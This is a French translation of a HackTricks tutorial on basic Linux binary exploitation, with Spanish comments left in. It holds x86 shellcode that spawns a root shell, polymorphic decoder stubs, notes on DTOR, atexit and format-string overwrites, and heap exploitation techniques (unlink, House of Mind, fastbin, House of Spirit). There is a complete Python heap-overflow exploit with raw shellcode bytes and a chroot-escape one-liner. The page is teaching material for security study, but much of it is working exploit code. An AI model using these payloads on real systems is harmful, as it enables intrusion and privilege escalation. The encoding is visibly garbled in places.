# Linux Exploiting (Basic) (FRA)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## **2.SHELLCODE**

Voir les interruptions du noyau : cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; nettoyer eax\
xor ebx, ebx ; ebx = 0 car il n'y a pas d'argument √† passer\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Ex√©cuter l'appel syst√®me

**nasm -f elf assembly.asm** ‚Äî> Renvoie un fichier .o\
**ld assembly.o -o shellcodeout** ‚Äî> Donne un ex√©cutable form√© par le code assembleur et nous pouvons extraire les opcodes avec **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Pour v√©rifier que c'est bien notre shellcode et extraire les opcodes

**V√©rifier que le shellcode fonctionne**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Pour v√©rifier que les appels syst√®me sont effectu√©s correctement, vous devez compiler le programme pr√©c√©dent et les appels syst√®me doivent appara√Ætre dans **strace ./PROGRAMA\_COMPILADO**

Lors de la cr√©ation de shellcodes, un truc peut √™tre utilis√©. La premi√®re instruction est un saut vers un appel. L'appel appelle le code original et place √©galement l'EIP dans la pile. Apr√®s l'instruction d'appel, nous avons plac√© la cha√Æne dont nous avions besoin, de sorte qu'avec cet EIP, nous pouvons pointer vers la cha√Æne et continuer √† ex√©cuter le code.

EX **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EJ en utilisant la pile (/bin/sh) :**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Chasseur d'≈ìufs :**

Il s'agit d'un petit code qui parcourt les pages de m√©moire associ√©es √† un processus √† la recherche de la shellcode qui y est stock√©e (recherche d'une signature sp√©cifique dans la shellcode). Utile dans les cas o√π il n'y a qu'un petit espace pour injecter du code.

**Shellcodes polymorphiques**

Ce sont des shells chiffr√©s qui contiennent un petit code pour les d√©chiffrer et y sauter, en utilisant l'astuce Call-Pop, voici un **exemple de chiffrement C√©sar** :
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. M√©thodes compl√©mentaires**

**Ret2Ret**

Utiles lorsque l'on ne peut pas ins√©rer une adresse de la pile dans l'EIP (v√©rifier que l'EIP ne contient pas 0xbf) ou lorsque l'emplacement de la shellcode ne peut pas √™tre calcul√©. Cependant, si la fonction vuln√©rable accepte un param√®tre (la shellcode ira ici).

Ainsi, en changeant l'EIP par une adresse de **ret**, la prochaine adresse charg√©e sera celle du premier argument de la fonction, c'est-√†-dire la shellcode.

L'exploit serait: SHELLCODE + Remplissage (jusqu'√† l'EIP) + **\&ret** (les octets suivants de la pile pointent vers le d√©but de la shellcode car l'adresse du param√®tre pass√© est plac√©e sur la pile)

Il semble que des fonctions comme **strncpy**, une fois termin√©es, effacent de la pile l'adresse o√π la shellcode √©tait stock√©e, rendant cette technique impossible. En d'autres termes, l'adresse pass√©e √† la fonction en tant qu'argument (celle qui stocke la shellcode) est modifi√©e par un 0x00, donc lors du deuxi√®me **ret**, un 0x00 est rencontr√© et le programme plante.

**Technique de Murat**

Sur Linux, tous les programmes sont mapp√©s √† partir de 0xbfffffff.

En examinant comment la pile d'un nouveau processus est construite sur Linux, il est possible de d√©velopper un exploit de mani√®re √† ce que le programme soit lanc√© dans un environnement o√π la seule variable est la shellcode. L'adresse de celle-ci peut alors √™tre calcul√©e comme suit : addr = 0xbfffffff - 4 - strlen(NOM\_executable\_complet) - strlen(shellcode)

Cela permettrait d'obtenir facilement l'adresse o√π se trouve la variable d'environnement avec la shellcode.

Cela est possible gr√¢ce √† la fonction execle qui permet de cr√©er un environnement n'ayant que les variables d'environnement souhait√©es.

**D√©bordements d'entiers**

Ce type de d√©bordements se produit lorsque une variable n'est pas pr√™te √† supporter un nombre aussi grand que celui qui lui est pass√©, peut-√™tre en raison d'une confusion entre les variables sign√©es et non sign√©es, par exemple:
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
Dans l'exemple pr√©c√©dent, nous voyons que le programme attend 2 param√®tres. Le premier est la longueur de la cha√Æne suivante et le second est la cha√Æne.

Si nous passons un nombre n√©gatif comme premier param√®tre, il affichera que len < 256 et nous passerons ce filtre, et de plus strlen(buffer) sera inf√©rieur √† l, car l est un unsigned int et sera tr√®s grand.

Ce type de d√©bordements ne vise pas √† √©crire quelque chose dans le processus du programme, mais √† contourner des filtres mal con√ßus pour exploiter d'autres vuln√©rabilit√©s.

**Variables non initialis√©es**

On ne sait pas quelle valeur peut prendre une variable non initialis√©e et il pourrait √™tre int√©ressant de l'observer. Il se peut qu'elle prenne la valeur qu'une variable de la fonction pr√©c√©dente prenait et celle-ci soit contr√¥l√©e par l'attaquant.

##

###

###

###

### **.fini\_array**

Essentiellement, il s'agit d'une structure avec des **fonctions qui seront appel√©es** avant la fin du programme. C'est int√©ressant si vous pouvez appeler votre **shellcode en sautant √† une adresse**, ou dans les cas o√π vous devez revenir √† main √† nouveau pour **exploiter la cha√Æne de format une deuxi√®me fois**.
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
Notez que cela **ne** **cr√©era pas** de **boucle infinie** car lorsque vous revenez √† la fonction principale, le canari le remarquera, la fin de la pile pourrait √™tre corrompue et la fonction ne sera pas rappel√©e. Ainsi, avec cela, vous pourrez **avoir 1 ex√©cution suppl√©mentaire** de la vuln√©rabilit√©.

### **Formatage des cha√Ænes pour extraire du contenu**

Une cha√Æne de format peut √©galement √™tre exploit√©e pour **extraire du contenu** de la m√©moire du programme.\
Par exemple, dans la situation suivante, il y a une **variable locale dans la pile pointant vers un drapeau**. Si vous **trouvez** o√π en **m√©moire** se trouve le **pointeur** vers le **drapeau**, vous pouvez faire en sorte que **printf acc√®de** √† cette **adresse** et **affiche** le **drapeau** :

Ainsi, le drapeau est √† **0xffffcf4c**

![](<../../.gitbook/assets/image (618) (2).png>)

Et √† partir de la fuite, vous pouvez voir que le **pointeur vers le drapeau** est dans le **8e** param√®tre :

![](<../../.gitbook/assets/image (623).png>)

Donc, en **acc√©dant** au **8e param√®tre**, vous pouvez obtenir le drapeau :

![](<../../.gitbook/assets/image (624).png>)

Notez qu'en suivant l'**exploit pr√©c√©dent** et en r√©alisant que vous pouvez **extraire du contenu**, vous pouvez **d√©finir des pointeurs** vers **`printf`** dans la section o√π l'**ex√©cutable** est **charg√©** et le **dumper** **enti√®rement** !

### **DTOR**

{% hint style="danger" %}
De nos jours, il est tr√®s **rare de trouver un binaire avec une section dtor**.
{% endhint %}

Les destructeurs sont des fonctions qui sont **ex√©cut√©es avant la fin du programme**.\
Si vous parvenez √† **√©crire** une **adresse** vers un **shellcode** dans **`__DTOR_END__`**, cela sera **ex√©cut√©** avant la fin des programmes.\
Obtenez l'adresse de cette section avec :
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep ‚Äú__DTOR‚Äù
```
D'habitude, vous trouverez la section **DTOR** **entre** les valeurs `ffffffff` et `00000000`. Donc si vous voyez juste ces valeurs, cela signifie qu'**aucune fonction n'est enregistr√©e**. Donc **√©crasez** le **`00000000`** avec l'**adresse** du **shellcode** pour l'ex√©cuter.

### **Cha√Ænes de format pour les d√©bordements de tampon**

La fonction **sprintf** d√©place une cha√Æne format√©e **vers** une **variable**. Par cons√©quent, vous pourriez abuser du **formatage** d'une cha√Æne pour provoquer un **d√©bordement de tampon dans la variable** o√π le contenu est copi√©.\
Par exemple, la charge utile `%.44xAAAA` √©crira **44 octets+"AAAA" dans la variable**, ce qui peut provoquer un d√©bordement de tampon.

### **Structures \_\_atexit**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`atexit()`** est une fonction √† laquelle **d'autres fonctions sont pass√©es en tant que param√®tres.** Ces **fonctions** seront **ex√©cut√©es** lors de l'ex√©cution d'un **`exit()`** ou du **retour** du **main**.\
Si vous pouvez **modifier** l'**adresse** de l'une de ces **fonctions** pour pointer vers un shellcode par exemple, vous **prendrez le contr√¥le** du **processus**, mais c'est actuellement plus compliqu√©.\
Actuellement, les **adresses des fonctions** √† ex√©cuter sont **cach√©es** derri√®re plusieurs structures et finalement l'adresse vers laquelle elles pointent n'est pas l'adresse des fonctions, mais elles sont **chiffr√©es avec XOR** et des d√©calages avec une **cl√© al√©atoire**. Donc actuellement, ce vecteur d'attaque n'est **pas tr√®s utile au moins sur x86** et **x64\_86**.\
La **fonction de chiffrement** est **`PTR_MANGLE`**. D'autres architectures telles que m68k, mips32, mips64, aarch64, arm, hppa... **n'impl√©mentent pas la fonction de chiffrement** car elle **renvoie la m√™me chose** qu'elle a re√ßue en entr√©e. Ainsi, ces architectures pourraient √™tre attaqu√©es par ce vecteur.

### **setjmp() & longjmp()**

{% hint style="danger" %}
De nos jours, il est tr√®s **√©trange d'exploiter cela**.
{% endhint %}

**`Setjmp()`** permet de **sauvegarder** le **contexte** (les registres)\
**`longjmp()`** permet de **restaurer** le **contexte**.\
Les **registres sauvegard√©s** sont : `EBX, ESI, EDI, ESP, EIP, EBP`\
Ce qui se passe est que EIP et ESP sont pass√©s par la fonction **`PTR_MANGLE`**, donc les **architectures vuln√©rables √† cette attaque sont les m√™mes que ci-dessus**.\
Ils sont utiles pour la r√©cup√©ration d'erreurs ou les interruptions.\
Cependant, d'apr√®s ce que j'ai lu, les autres registres ne sont pas prot√©g√©s, **donc s'il y a un `call ebx`, `call esi` ou `call edi`** √† l'int√©rieur de la fonction appel√©e, le contr√¥le peut √™tre pris. Ou vous pourriez √©galement modifier EBP pour modifier ESP.

**VTable et VPTR en C++**

Chaque classe a une **Vtable** qui est un tableau de **pointeurs vers des m√©thodes**.

Chaque objet d'une **classe** a un **VPtr** qui est un **pointeur** vers le tableau de sa classe. Le VPtr fait partie de l'en-t√™te de chaque objet, donc si une **modification** du **VPtr** est r√©alis√©e, il pourrait √™tre **modifi√©** pour **pointer** vers une m√©thode factice de sorte que l'ex√©cution d'une fonction aille vers le shellcode.

## **Mesures pr√©ventives et √©vasions**

###

**Remplacement de Libsafe**

Activ√© par : LD\_PRELOAD=/lib/libsafe.so.2\
ou\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Il intercepte les appels √† certaines fonctions non s√©curis√©es par d'autres s√©curis√©es. Ce n'est pas standardis√©. (uniquement pour x86, pas pour les compilations avec -fomit-frame-pointer, pas de compilations statiques, toutes les fonctions vuln√©rables ne deviennent pas s√©curis√©es et LD\_PRELOAD ne fonctionne pas sur les binaires avec suid).

**Espace d'adressage ASCII Armored**

Consiste √† charger les biblioth√®ques partag√©es de 0x00000000 √† 0x00ffffff pour qu'il y ait toujours un octet 0x00. Cependant, cela ne arr√™te pratiquement aucune attaque, et encore moins en little endian.

**ret2plt**

Consiste √† effectuer un ROP de mani√®re √† appeler la fonction strcpy@plt (de la plt) et √† pointer vers l'entr√©e de la GOT et √† copier le premier octet de la fonction √† appeler (system()). Ensuite, la m√™me op√©ration est effectu√©e en pointant vers GOT+1 et en copiant le 2√®me octet de system()... Enfin, l'adresse stock√©e dans la GOT qui sera system() est appel√©e.

**Jails avec chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Installe un syst√®me de base dans un sous-r√©pertoire sp√©cifique

Un administrateur peut sortir de l'une de ces prisons en faisant : mkdir foo; chroot foo; cd ..

**Instrumentation de code**

Valgrind ‚Äî> Recherche d'erreurs\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 D√©bordements de tas : Exploits de base**

**Bloc allou√©**

prev\_size |\
size | ‚ÄîEn-t√™te\
\*mem | Donn√©es

**Bloc libre**

prev\_size |\
size |\
\*fd | Ptr chunk suivant\
\*bk | Ptr chunk pr√©c√©dent ‚ÄîEn-t√™te\
\*mem | Donn√©es

Les blocs libres sont dans une liste doublement cha√Æn√©e (bin) et il ne peut jamais y avoir deux blocs libres cons√©cutifs (ils sont fusionn√©s)

Dans "size", il y a des bits pour indiquer : Si le bloc pr√©c√©dent est en cours d'utilisation, si le bloc a √©t√© allou√© via mmap() et si le bloc appartient √† l'ar√®ne principale.

Lorsqu'un bloc est lib√©r√© et que l'un des blocs adjacents est libre, ceux-ci sont fusionn√©s √† l'aide de la macro unlink() et le nouveau bloc le plus grand est pass√© √† frontlink() pour qu'il soit ins√©r√© dans le bon bin.

unlink(){\
BK = P->bk; ‚Äî> Le BK du nouveau chunk est celui qui √©tait libre avant\
FD = P->fd; ‚Äî> Le FD du nouveau chunk est celui qui √©tait libre avant\
FD->bk = BK; ‚Äî> Le BK du chunk suivant pointe vers le nouveau chunk\
BK->fd = FD; ‚Äî> Le FD du chunk pr√©c√©dent pointe vers le nouveau chunk\
}

Par cons√©quent, si nous parvenons √† modifier P->bk avec l'adresse d'un shellcode et P->fd avec l'adresse d'une entr√©e dans la GOT ou DTORS moins 12, nous obtenons :

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

Ainsi, le shellcode s'ex√©cute √† la sortie du programme.

De plus, la 4√®me instruction de unlink() √©crit quelque chose et le shellcode doit √™tre ajust√© pour cela :

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Cela provoque l'√©criture de 4 octets √† partir du 8√®me octet du shellcode, donc la premi√®re instruction du shellcode doit √™tre un jmp pour sauter cela et atteindre des nops qui m√®nent au reste du shellcode.

Par cons√©quent, l'exploit est cr√©√© :

Dans le tampon1, nous ins√©rons le shellcode en commen√ßant par un jmp pour qu'il atteigne les nops ou le reste du shellcode.

Apr√®s le shellcode, nous ins√©rons du rembourrage jusqu'√† atteindre le champ prev\_size et size du chunk suivant. √Ä ces endroits, nous ins√©rons 0xfffffff0 (pour √©craser prev\_size pour qu'il ait le bit indiquant qu'il est libre) et "-4" (0xfffffffc) dans size (pour que lors de la v√©rification dans le 3√®me chunk si le 2√®me √©tait libre, en r√©alit√© il aille au prev\_size modifi√© qui lui dira qu'il est libre) -> Ainsi, lorsque free() enqu√™te, il ira au size du 3√®me mais en r√©alit√© ira au 2√®me - 4 et pensera que le 2√®me bloc est libre. Il appellera alors **unlink()**.

En appelant unlink(), les premi√®res donn√©es du 2√®me bloc seront utilis√©es comme P->fd, donc l'adresse que vous souhaitez √©craser - 12 (car dans FD->bk, 12 sera ajout√© √† l'adresse stock√©e dans FD). Et √† cette adresse, la deuxi√®me adresse du 2√®me bloc sera ins√©r√©e, qui devrait √™tre l'adresse du shellcode (fausse P->bk).

**from struct import \***

**import os**
**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Il est important que le bit indiquant que le chunk pr√©c√©dent est libre soit √† 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, pour que le "size" du 3√®me chunk soit d√©cal√© de 4 octets (pointe vers prev\_size) l√† o√π il v√©rifie si le 2√®me chunk est libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Dans le payload, nous allons ajouter 8 octets de remplissage au d√©but**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresse de free() dans la plt-12 (sera √©cras√©e pour ex√©cuter le shellcode la 2√®me fois que free est appel√©)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Comme mentionn√©, le payload commence par 8 octets de remplissage pour une raison quelconque**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Le 2√®me chunk est modifi√©, got\_free pointe vers o√π nous allons stocker l'adresse addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() lib√©rant dans l'ordre inverse (wargame)**

Nous contr√¥lons 3 chunks cons√©cutifs et ils sont lib√©r√©s dans l'ordre inverse de leur r√©servation.

Dans ce cas :

Le shellcode est plac√© dans le chunk c

Le chunk a est utilis√© pour √©craser le b de sorte que le bit PREV\_INUSE du size soit d√©sactiv√©, faisant croire que le chunk a est libre.

De plus, le size dans l'en-t√™te de b est √©cras√© pour qu'il soit de -4.

Ainsi, le programme pensera que "a" est libre et dans un bin, donc il appellera unlink() pour le d√©tacher. Cependant, comme l'en-t√™te PREV\_SIZE est de -4, il pensera que le chunk "a" commence r√©ellement √† b+4. En d'autres termes, il d√©tachera un chunk commen√ßant √† b+4, donc √† b+12, le pointeur "fd" sera et √† b+16, le pointeur "bk".

De cette mani√®re, si nous mettons l'adresse du shellcode dans bk et l'adresse de la fonction "puts()" -12 dans fd, nous avons notre payload.

**Technique de Frontlink**

Frontlink est appel√© lorsqu'un chunk est lib√©r√© et aucun de ses chunks adjacents n'est libre, unlink() n'est pas appel√© mais frontlink() l'est directement.

Vuln√©rabilit√© utile lorsque le malloc attaqu√© n'est jamais lib√©r√© (free()).

N√©cessite :

Un tampon pouvant √™tre d√©bord√© avec la fonction de saisie de donn√©es

Un tampon contigu √† celui-ci qui doit √™tre lib√©r√© et dont le champ fd de l'en-t√™te sera modifi√© gr√¢ce au d√©bordement du tampon pr√©c√©dent

Un tampon √† lib√©rer avec une taille sup√©rieure √† 512 mais inf√©rieure au tampon pr√©c√©dent

Un tampon d√©clar√© avant l'√©tape 3 qui permet de remplacer le prev\_size de celui-ci

En contr√¥lant ainsi deux mallocs de mani√®re incontr√¥l√©e et un de mani√®re contr√¥l√©e mais qui n'est lib√©r√© qu'une seule fois, nous pouvons exploiter la vuln√©rabilit√©.

**Vuln√©rabilit√© double free()**

Si free() est appel√© deux fois avec le m√™me pointeur, deux bins pointent vers la m√™me adresse.

Si l'on veut r√©utiliser l'un, il sera assign√© sans probl√®me. Si l'on veut utiliser l'autre, il sera assign√© √† la m√™me zone m√©moire, donc les pointeurs "fd" et "bk" seront falsifi√©s avec les donn√©es √©crites par la r√©servation pr√©c√©dente.

**After free()**

Un pointeur pr√©c√©demment lib√©r√© est r√©utilis√© sans contr√¥le.

## **8 D√©bordements de tas : Exploits avanc√©s**

Les techniques Unlink() et FrontLink() ont √©t√© supprim√©es en modifiant la fonction unlink().

**The house of mind**

Seule une seule appel √† free() est n√©cessaire pour provoquer l'ex√©cution de code arbitraire. Il est int√©ressant de rechercher un deuxi√®me chunk qui peut √™tre d√©bord√© par un pr√©c√©dent et lib√©r√©.

Un appel √† free() entra√Æne un appel √† public\_fREe(mem), qui fait :

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Renvoie un pointeur vers l'adresse o√π commence le chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for_chunk(p); ‚Äî> chunk\_non\_main_arena(ptr)?heap_for_ptr(ptr)->ar_ptr:\&main_arena \[1]

‚Ä¶

_int_free(ar_ptr, mem);

}

Dans \[1], il v√©rifie le champ size du bit NON_MAIN_ARENA, qui peut √™tre modifi√© pour que la v√©rification renvoie true et ex√©cute heap_for_ptr() qui effectue un and √† "mem" en mettant √† 0 les 2,5 octets les moins significatifs (dans notre cas, de 0x0804a000, il laisse 0x08000000) et acc√®de √† 0x08000000->ar_ptr (comme s'il s'agissait d'une structure heap_info)

De cette mani√®re, si nous pouvons contr√¥ler un chunk par exemple √† 0x0804a000 et qu'un chunk est lib√©r√© √† **0x081002a0**, nous pouvons atteindre l'adresse 0x08100000 et √©crire ce que nous voulons, par exemple **0x0804a000**. Lorsque ce deuxi√®me chunk est lib√©r√©, il trouvera que heap_for_ptr(ptr)->ar_ptr renvoie ce que nous avons √©crit √† 0x08100000 (car il applique l'and √† 0x081002a0 que nous avons vu auparavant et de l√†, il extrait la valeur des 4 premiers octets, l'ar_ptr)

Ainsi, _int_free(ar_ptr, mem) est appel√©, c'est-√†-dire, **_int_free(0x0804a000, 0x081002a0)**\
**_int_free(mstate av, Void_t\* mem){**\
‚Ä¶\
bck = unsorted_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Comme nous l'avons vu pr√©c√©demment, nous pouvons contr√¥ler la valeur de av, car c'est ce que nous √©crivons dans le chunk qui va √™tre lib√©r√©.

Comme unsorted_chunks est d√©fini, nous savons que :\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Par cons√©quent, si nous √©crivons la valeur de \_\_DTOR_END\_\_-12 dans av->bins\[2], √† la derni√®re instruction, l'adresse du prev_size du chunk 2 sera √©crite dans \_\_DTOR_END\_\_.

En d'autres termes, dans le premier chunk, nous devons mettre au d√©but plusieurs fois l'adresse de \_\_DTOR_END\_\_-12 car av->bins\[2] le prendra de l√†.

√Ä l'adresse o√π tombe l'adresse du deuxi√®me chunk avec les 5 derniers z√©ros, nous devons √©crire l'adresse de ce premier chunk pour que heap_for_ptr() pense que ar_ptr est au d√©but du premier chunk et extrait av->bins\[2] de l√†.

Dans le deuxi√®me chunk et gr√¢ce au premier, nous √©crivons prev_size avec un jump 0x0c et size avec quelque chose pour activer -> NON_MAIN_ARENA

Ensuite, dans le chunk 2, nous mettons beaucoup de nops et enfin le shellcode

Ainsi, _int_free(chunk1, chunk2) sera appel√© et suivra les instructions pour √©crire dans \_\_DTOR_END\_\_ l'adresse du prev_size du chunk 2 qui sautera vers le shellcode.
Pour appliquer cette technique, il est n√©cessaire de remplir certaines conditions suppl√©mentaires qui compliquent un peu plus la charge utile.

Cette technique n'est plus applicable car presque le m√™me correctif que pour unlink a √©t√© appliqu√©. On compare si le nouveau site vers lequel il pointe pointe √©galement vers lui.

**Fastbin**

C'est une variante de The house of mind

Nous voulons ex√©cuter le code suivant apr√®s avoir pass√© la premi√®re v√©rification de la fonction \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> O√π fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De cette mani√®re, si "fb" est plac√© √† l'adresse d'une fonction dans la GOT, l'adresse du morceau √©cras√© sera plac√©e √† cette adresse. Pour cela, il sera n√©cessaire que l'ar√®ne soit proche des adresses de dtors. Plus pr√©cis√©ment, av->max\_fast doit √™tre √† l'adresse que nous allons √©craser.

√âtant donn√© que avec The House of Mind nous avons vu que nous contr√¥lions la position de av.

Ainsi, si nous mettons une taille de 8 + NON\_MAIN\_ARENA + PREV\_INUSE dans le champ size, fastbin\_index() nous renverra fastbins\[-1\], qui pointera vers av->max\_fast

Dans ce cas, av->max\_fast sera l'adresse qui sera √©cras√©e (non celle vers laquelle elle pointe, mais cette position sera √©cras√©e).

De plus, il faut que le morceau contigu au morceau lib√©r√© soit plus grand que 8 -> Comme nous avons dit que la taille du morceau lib√©r√© est de 8, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe dans des nops).

De plus, ce m√™me faux morceau doit √™tre plus petit que av->system\_mem. av->system\_mem se trouve √† 1848 octets plus loin.

En raison des z√©ros de \_DTOR\_END\_ et des quelques adresses dans la GOT, aucune de ces adresses de ces sections ne convient pour √™tre √©cras√©e, donc voyons comment appliquer fastbin pour attaquer la pile.

Une autre forme d'attaque consiste √† rediriger le **av** vers la pile.

Si nous modifions la taille pour qu'elle soit de 16 au lieu de 8 alors : fastbin\_index() nous renverra fastbins\[0\] et nous pouvons utiliser cela pour √©craser la pile.

Pour cela, il ne doit y avoir aucun canary ni de valeurs √©tranges dans la pile, en fait nous devons nous trouver dans celle-ci : 4 octets nuls + EBP + RET

Les 4 octets nuls sont n√©cessaires pour que le **av** soit √† cette adresse et le premier √©l√©ment d'un **av** est le mutex qui doit valoir 0.

Le **av->max\_fast** sera l'EBP et sera une valeur qui nous permettra de contourner les restrictions.

Dans le **av->fastbins\[0\]** sera √©cras√© avec l'adresse de **p** et sera le RET, ainsi il sautera √† la shellcode.

De plus, dans **av->system\_mem** (1484 octets au-dessus de la position dans la pile) il y aura assez de d√©chets qui nous permettront de contourner la v√©rification qui est effectu√©e.

De plus, il faut que le morceau contigu au morceau lib√©r√© soit plus grand que 8 -> Comme nous avons dit que la taille du morceau lib√©r√© est de 16, dans ce faux morceau, nous devons simplement mettre une taille sup√©rieure √† 8 (comme la shellcode sera dans le morceau lib√©r√©, nous devrons mettre un jmp au d√©but qui tombe dans des nops qui viennent apr√®s le champ size du nouveau faux morceau).

**The House of Spirit**

Dans ce cas, nous cherchons √† avoir un pointeur vers un malloc qui peut √™tre modifi√© par l'attaquant (par exemple, le pointeur est sur la pile sous un √©ventuel d√©bordement d'une variable).

Ainsi, nous pourrions faire pointer ce pointeur o√π nous voulons. Cependant, n'importe quel endroit n'est pas valide, la taille du morceau falsifi√© doit √™tre inf√©rieure √† av->max\_fast et plus sp√©cifiquement √©gale √† la taille demand√©e dans un appel futur √† malloc()+8. Par cons√©quent, si nous savons qu'apr√®s ce pointeur vuln√©rable, un malloc(40) est appel√©, la taille du morceau falsifi√© doit √™tre √©gale √† 48.

